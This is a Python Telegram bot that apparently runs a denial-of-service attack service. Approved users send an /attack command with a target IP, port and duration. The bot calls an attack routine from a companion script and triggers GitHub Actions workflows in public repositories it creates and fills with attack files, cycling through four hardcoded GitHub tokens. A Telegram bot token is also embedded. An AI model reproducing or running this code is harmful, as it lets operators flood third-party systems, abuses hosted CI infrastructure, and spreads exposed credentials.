# bot.py
import time
import asyncio
import threading
import os
import base64
import requests
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
from telegram import Update

TELEGRAM_TOKEN = "7788865701:AAHFVFbSdhpRuMTmLj987J8BmwKLR3j4brk"
ADMIN_ID = 7163028849
BOT_OWNER = "SOULCRACK"

# GitHub configuration
GITHUB_TOKENS = ["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", "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", "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", "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"]  # Add your GitHub tokens here
current_token_index = 0

approved_users = {}
active_attacks = {}
github_repos = {}  # Store repo info: {repo_name: {"url": url, "token": token, "workflow_runs": []}}

def is_admin(user_id: int):
    return user_id == ADMIN_ID

def is_approved(user_id: int):
    return approved_users.get(user_id, False)

def approve_user(user_id: int):
    approved_users[user_id] = True

def get_next_github_token():
    """Round-robin through available GitHub tokens"""
    global current_token_index
    token = GITHUB_TOKENS[current_token_index]
    current_token_index = (current_token_index + 1) % len(GITHUB_TOKENS)
    return token

approve_user(ADMIN_ID)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(f"Welcome to {BOT_OWNER} Bot!")

async def approve(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_admin(user_id):
        await update.message.reply_text("❌ You are not authorized to approve users.")
        return
    if len(context.args) != 1:
        await update.message.reply_text("Usage: /approve <user_id>")
        return
    try:
        target_id = int(context.args[0])
        approve_user(target_id)
        await update.message.reply_text(f"✅ User {target_id} approved.")
    except ValueError:
        await update.message.reply_text("⚠️ Please provide a valid user ID.")

async def upload(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_approved(user_id):
        await update.message.reply_text("❌ You are not approved to use this command.")
        return
    
    if len(context.args) < 1:
        await update.message.reply_text("Usage: /upload <repo_name> [description]")
        return
    
    repo_name = context.args[0]
    description = " ".join(context.args[1:]) if len(context.args) > 1 else "Attack repository"
    
    # Check if repo already exists
    if repo_name in github_repos:
        await update.message.reply_text(f"⚠️ Repository '{repo_name}' already exists.")
        return
    
    await update.message.reply_text(f"🔄 Creating repository '{repo_name}'...")
    
    # Get GitHub token
    token = get_next_github_token()
    
    # Create repository
    create_url = "https://api.github.com/user/repos"
    headers = {
        "Authorization": f"token {token}",
        "Accept": "application/vnd.github.v3+json"
    }
    data = {
        "name": repo_name,
        "description": description,
        "auto_init": False,
        "private": False
    }
    
    try:
        response = requests.post(create_url, headers=headers, json=data)
        if response.status_code not in [200, 201]:
            await update.message.reply_text(f"❌ Failed to create repository: {response.json().get('message', 'Unknown error')}")
            return
        
        repo_info = response.json()
        repo_url = repo_info["html_url"]
        clone_url = repo_info["clone_url"]
        
        # Upload files
        await update.message.reply_text("🔄 Uploading files...")
        
        # Read and encode files
        files_to_upload = {
            "jay.py": open("jay.py", "rb").read(),
            "jay.yml": open("jay.yml", "rb").read(),
            "soul": open("soul", "rb").read()
        }
        
        # Create .github/workflows directory and upload jay.yml there
        workflow_dir_url = f"https://api.github.com/repos/{repo_info['owner']['login']}/{repo_name}/contents/.github/workflows/jay.yml"
        
        # Upload jay.yml to workflows directory
        workflow_content = base64.b64encode(files_to_upload["jay.yml"]).decode('utf-8')
        workflow_data = {
            "message": "Add workflow file",
            "content": workflow_content
        }
        
        response = requests.put(workflow_dir_url, headers=headers, json=workflow_data)
        if response.status_code not in [200, 201]:
            await update.message.reply_text(f"⚠️ Could not create workflow directory: {response.json().get('message', 'Unknown error')}")
        
        # Upload other files to root
        for filename, content in files_to_upload.items():
            if filename == "jay.yml":
                continue  # Already uploaded to workflows directory
                
            file_url = f"https://api.github.com/repos/{repo_info['owner']['login']}/{repo_name}/contents/{filename}"
            file_content = base64.b64encode(content).decode('utf-8')
            file_data = {
                "message": f"Add {filename}",
                "content": file_content
            }
            
            response = requests.put(file_url, headers=headers, json=file_data)
            if response.status_code not in [200, 201]:
                await update.message.reply_text(f"⚠️ Could not upload {filename}: {response.json().get('message', 'Unknown error')}")
        
        # Store repo info
        github_repos[repo_name] = {
            "url": repo_url,
            "clone_url": clone_url,
            "token": token,
            "owner": repo_info['owner']['login'],
            "workflow_runs": []
        }
        
        await update.message.reply_text(f"✅ Repository created: {repo_url}\n🔑 Using token: {token[:8]}...")
        
    except Exception as e:
        await update.message.reply_text(f"❌ Error creating repository: {str(e)}")

async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_approved(user_id):
        await update.message.reply_text("❌ You are not approved to use this command.")
        return
    if len(context.args) != 3:
        await update.message.reply_text("Usage: /attack <ip> <port> <time>")
        return

    ip, port, time_s = context.args
    try:
        time_int = int(time_s)
    except ValueError:
        await update.message.reply_text("⚠️ Invalid time.")
        return
    
    # Check if we have any GitHub repositories
    if not github_repos:
        await update.message.reply_text("❌ No GitHub repositories available. Use /upload first.")
        return
    
    # Select a repository (for simplicity, use the first one)
    repo_name = list(github_repos.keys())[0]
    repo_info = github_repos[repo_name]
    
    # Start the attack directly using jay.py functionality
    attack_id = f"{ip}:{port}:{time_s}"
    if attack_id in active_attacks:
        await update.message.reply_text("⚠️ This attack is already running.")
        return
    
    # Import and use jay.py functions directly
    try:
        from jay import launch_attack
        success = launch_attack(ip, port, time_s)
        
        if success:
            active_attacks[attack_id] = {
                'start_time': time.time(),
                'duration': time_int,
                'user_id': user_id,
                'repo_name': repo_name
            }
            
            # Trigger workflow dispatch
            await trigger_workflow_dispatch(repo_name, repo_info, ip, port, time_s)
            
            await update.message.reply_text(
                f"🚀 Attack started on {ip}:{port} for {time_s} seconds!\n"
                f"📦 Using repository: {repo_name}\n"
                f"🔍 Monitoring workflows..."
            )
            
            # Start monitoring workflow status
            asyncio.create_task(monitor_workflows(update, context, attack_id, repo_name))
            
            # Schedule a task to remove the attack from active_attacks after completion
            asyncio.create_task(attack_completion_notification(update, context, attack_id, time_int))
        else:
            await update.message.reply_text("⚠️ Failed to start attack.")
    except Exception as e:
        await update.message.reply_text(f"⚠️ Error starting attack: {e}")

async def trigger_workflow_dispatch(repo_name, repo_info, ip, port, time_s):
    """Trigger workflow dispatch for the attack"""
    try:
        headers = {
            "Authorization": f"token {repo_info['token']}",
            "Accept": "application/vnd.github.v3+json"
        }
        
        dispatch_url = f"https://api.github.com/repos/{repo_info['owner']}/{repo_name}/actions/workflows/jay.yml/dispatches"
        data = {
            "ref": "main",
            "inputs": {
                "ip": ip,
                "port": port,
                "time": time_s
            }
        }
        
        response = requests.post(dispatch_url, headers=headers, json=data)
        return response.status_code in [200, 201]
    except Exception as e:
        print(f"Error triggering workflow: {e}")
        return False

async def monitor_workflows(update, context, attack_id, repo_name):
    """Monitor workflow status and send updates every 5 seconds"""
    if repo_name not in github_repos:
        return
    
    repo_info = github_repos[repo_name]
    headers = {
        "Authorization": f"token {repo_info['token']}",
        "Accept": "application/vnd.github.v3+json"
    }
    
    workflow_url = f"https://api.github.com/repos/{repo_info['owner']}/{repo_name}/actions/runs"
    
    start_time = time.time()
    duration = active_attacks[attack_id]['duration']
    
    while time.time() - start_time < duration + 10:  # Monitor for duration + 10 seconds
        if attack_id not in active_attacks:
            break
            
        try:
            response = requests.get(workflow_url, headers=headers)
            if response.status_code == 200:
                workflow_data = response.json()
                workflow_runs = workflow_data.get('workflow_runs', [])
                
                # Count statuses
                status_counts = {
                    'queued': 0,
                    'in_progress': 0,
                    'completed': 0,
                    'failed': 0,
                    'total': len(workflow_runs)
                }
                
                for run in workflow_runs:
                    status = run.get('status', '')
                    conclusion = run.get('conclusion', '')
                    
                    if status == 'queued':
                        status_counts['queued'] += 1
                    elif status == 'in_progress':
                        status_counts['in_progress'] += 1
                    elif status == 'completed':
                        if conclusion == 'success':
                            status_counts['completed'] += 1
                        else:
                            status_counts['failed'] += 1
                
                # Update message
                status_message = (
                    f"📊 Workflow Status for {repo_name}:\n"
                    f"✅ Completed: {status_counts['completed']}\n"
                    f"🔄 In Progress: {status_counts['in_progress']}\n"
                    f"⏳ Queued: {status_counts['queued']}\n"
                    f"❌ Failed: {status_counts['failed']}\n"
                    f"📈 Total: {status_counts['total']}"
                )
                
                # Edit or send new message
                if 'status_message_id' not in active_attacks[attack_id]:
                    message = await update.message.reply_text(status_message)
                    active_attacks[attack_id]['status_message_id'] = message.message_id
                else:
                    try:
                        await context.bot.edit_message_text(
                            chat_id=update.effective_chat.id,
                            message_id=active_attacks[attack_id]['status_message_id'],
                            text=status_message
                        )
                    except:
                        # Message might not be editable, send new one
                        message = await update.message.reply_text(status_message)
                        active_attacks[attack_id]['status_message_id'] = message.message_id
                
                # Store workflow runs for later reference
                github_repos[repo_name]['workflow_runs'] = workflow_runs
                
            await asyncio.sleep(5)  # Wait 5 seconds before next update
        except Exception as e:
            print(f"Error monitoring workflows: {e}")
            await asyncio.sleep(5)

async def attack_completion_notification(update, context, attack_id, duration):
    await asyncio.sleep(duration)
    if attack_id in active_attacks:
        ip, port, time_s = attack_id.split(':')
        await update.message.reply_text(f"✅ Attack finished on {ip}:{port}!")
        
        # Clean up status message if it exists
        if 'status_message_id' in active_attacks[attack_id]:
            try:
                await context.bot.delete_message(
                    chat_id=update.effective_chat.id,
                    message_id=active_attacks[attack_id]['status_message_id']
                )
            except:
                pass
        
        del active_attacks[attack_id]

async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_approved(user_id):
        await update.message.reply_text("❌ You are not approved to use this command.")
        return
    
    if len(context.args) != 1:
        await update.message.reply_text("Usage: /stop <attack_id>")
        return
    
    attack_id = context.args[0]
    if attack_id in active_attacks:
        # Import and use jay.py functions directly to stop attack
        try:
            from jay import stop_attack
            ip, port, time_s = attack_id.split(':')
            success = stop_attack(ip, port)
            
            if success:
                # Clean up status message if it exists
                if 'status_message_id' in active_attacks[attack_id]:
                    try:
                        await context.bot.delete_message(
                            chat_id=update.effective_chat.id,
                            message_id=active_attacks[attack_id]['status_message_id']
                        )
                    except:
                        pass
                
                del active_attacks[attack_id]
                await update.message.reply_text(f"✅ Attack {attack_id} stopped!")
            else:
                await update.message.reply_text(f"⚠️ Failed to stop attack {attack_id}.")
        except Exception as e:
            await update.message.reply_text(f"⚠️ Error stopping attack: {e}")
    else:
        await update.message.reply_text("⚠️ Attack ID not found.")

async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_approved(user_id):
        await update.message.reply_text("❌ You are not approved to use this command.")
        return
    
    if active_attacks:
        status_text = "🟢 Active Attacks:\n"
        for attack_id, info in active_attacks.items():
            elapsed = int(time.time() - info['start_time'])
            remaining = max(0, info['duration'] - elapsed)
            status_text += f"• {attack_id} - {remaining}s remaining\n"
        await update.message.reply_text(status_text)
    else:
        await update.message.reply_text("ℹ️ No active attacks.")
    
    if github_repos:
        repos_text = "📦 GitHub Repositories:\n"
        for repo_name, repo_info in github_repos.items():
            repos_text += f"• {repo_name} - {repo_info['url']}\n"
        await update.message.reply_text(repos_text)
    else:
        await update.message.reply_text("ℹ️ No GitHub repositories.")

async def list_repos(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_approved(user_id):
        await update.message.reply_text("❌ You are not approved to use this command.")
        return
    
    if github_repos:
        repos_text = "📦 Available Repositories:\n"
        for repo_name, repo_info in github_repos.items():
            repos_text += f"• {repo_name} - {repo_info['url']}\n"
        await update.message.reply_text(repos_text)
    else:
        await update.message.reply_text("ℹ️ No GitHub repositories available.")

def main():
    application = ApplicationBuilder().token(TELEGRAM_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("approve", approve))
    application.add_handler(CommandHandler("upload", upload))
    application.add_handler(CommandHandler("attack", attack))
    application.add_handler(CommandHandler("stop", stop))
    application.add_handler(CommandHandler("status", status))
    application.add_handler(CommandHandler("repos", list_repos))
    application.run_polling()

if __name__ == "__main__":
    main()
